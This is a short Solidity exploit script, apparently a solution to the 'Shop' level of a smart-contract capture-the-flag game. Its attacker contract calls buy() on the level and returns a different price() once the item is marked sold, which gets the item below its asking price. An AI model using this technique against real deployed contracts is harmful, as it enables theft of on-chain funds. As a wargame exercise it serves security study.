// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/21-Shop/Shop.sol";

contract ExploitScript is Script {
    ShopHack ShopHackAddr;
    Shop level21 = Shop(payable(0xea2C47f544577FdBEF0b2E4dAfDeBba89980a0b1));

    function run() public {
       vm.startBroadcast();
       ShopHackAddr  = new ShopHack();
       ShopHackAddr.attack();
       vm.stopBroadcast();
    }
}



contract ShopHack {
    Shop level21 = Shop(0xea2C47f544577FdBEF0b2E4dAfDeBba89980a0b1);

 
   function attack() external {
      level21.buy();
  }
    function price () external view returns (uint) {
    return level21.isSold() ? 1 : 101;
}
}